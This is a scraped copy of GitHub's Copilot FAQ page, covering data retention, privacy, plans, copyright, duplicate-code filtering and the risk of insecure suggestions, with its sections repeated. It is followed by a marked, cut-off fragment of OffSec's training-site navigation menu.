**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

## Footnotes

1. [Authentication with SAML single sign-on (SSO)](https://docs.github.com/en/enterprise-cloud%40latest/authentication/authenticating-with-saml-single-sign-on/about-authentication-with-saml-single-sign-on) available for organizations using GitHub Enterprise Cloud.

## Site-wide Links

### Subscribe to our developer newsletter

Get tips, technical guides, and best practices. Twice a month. Right in your inbox.

[Subscribe](https://resources.github.com/newsletter/)

### Product

* [Features](/features)
* [Enterprise](/enterprise)
* [Copilot](/features/copilot)
* [Security](/security)
* [Pricing](/pricing)
* [Team](/team)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare)

### Platform

* [Developer API](https://docs.github.com/get-started/exploring-integrations/about-building-integrations)
* [Partners](https://partner.github.com)
* [Education](https://github.com/edu)
* [GitHub CLI](https://cli.github.com)
* [GitHub Desktop](https://desktop.github.com)
* [GitHub Mobile](https://github.com/mobile)

### Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com)
* [Premium Support](/enterprise/premium-support)
* [Skills](https://skills.github.com)
* [Status](https://www.githubstatus.com)
* [Contact GitHub](https://support.github.com?tags=dotcom-footer)

### Company

* [About](https://github.com/about)
* [Customer stories](/customer-stories?type=enterprise)
* [Blog](https://github.blog)
* [The ReadME Project](/readme)
* [Careers](https://github.careers)
* [Newsroom](/newsroom)
* [Inclusion](/about/diversity)
* [Social Impact](https://socialimpact.github.com)
* [Shop](https://shop.github.com)

* © 2025 GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
  ([Updated 02/2024](https://github.com/github/site-policy/pull/582))
* [Sitemap](/sitemap)
* [What is Git?](/git-guides)
* Manage cookies
* Do not share my personal information

* [GitHub on LinkedIn](https://www.linkedin.com/company/github)
* [Instagram
  GitHub on Instagram](https://www.instagram.com/github)
* [GitHub on YouTube](https://www.youtube.com/github)
* [GitHub on X](https://x.com/github)
* [TikTok
  GitHub on TikTok](https://www.tiktok.com/%40github)
* [Twitch
  GitHub on Twitch](https://www.twitch.tv/github)
* [GitHub’s organization on GitHub](https://github.com/github)

You can’t perform that action at this time.



=== Content from www.offsec.com_c84a2d9e_20250126_062445.html ===


* Solutions Learning Solutions            Learning Library Cyber workforce resilience and career development with hands-on, real-world training      Cyber Ranges Live-fire simulations to train your team and stay ahead of the latest threats         [Courses & Certifications

  Industry-leading certifications and training for continuous learning](https://www.offsec.com/courses-and-certifications)   [Learning Paths

  Focused training to develop skills based on a specific area of interest](https://www.offsec.com/learning/paths)   [Job Roles

  Rigorous training content and labs for the most critical and in-demand job roles](https://www.offsec.com/learning)   [Skills Development

  Focused training to develop critical cybersecurity skills](https://www.offsec.com/learning/skill-paths-pins)   [Industry Frameworks

  Framework-specific training for MITRE ATT&CK, D3FEND and NIST/NICE](https://www.offsec.com/learning/industry-frameworks)   [Explore Learning Library](https://portal.offsec.com/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)     [Enterprise Cyber Range & Versus

  Set up tournaments and test red and blue team skills in a live-fire cyber range](https://www.offsec.com/enterprise/cyber-range)   [Offensive Cyber Range

  Train on the latest attack vectors to address vulnerabilities](https://www.offsec.com/enterprise/cyber-range/offensive)   [Defensive Cyber Range

  Prepare for the next attack with simulated real-world training environments](https://www.offsec.com/enterprise/cyber-range/defensive)   [Watch a demo](https://learn.offsec.com/webinar-cyber-drills-versus/?utm_source=offsec)     [Exclusive

  Hands-on training in live-fire, enterprise environments

  Use our most powerful cyber range to develop a cyber resilient workforce

  ![Hands-on training in live-fire, enterprise environments](https://manage.offsec.com/app/uploads/2024/05/live_fire_feat.png)](https://www.offsec.com/enterprise/cyber-range/versus)
* Why OffSec            Organizations Continuous learning & skill development to build cyber workforce resilience      Individuals Get industry leading training and reinforce learning with hands-on labs         [Teams & Enterprises

  Continuous learning & hands-on skills development for cybersecurity teams](https://www.offsec.com/organizations/enterprise)   [Public Sector

  Unique training for government agencies and educational institutions](https://www.offsec.com/public-sector)   [Use Cases

  Meet critical cyber workforce needs with OffSec's learning platform](https://www.offsec.com/use-cases)   [Industries

  Purpose-built and industry-recognized cybersecurity training](https://www.offsec.com/industry)   [Contact sales](https://www.offsec.com/sales)     [Recommended

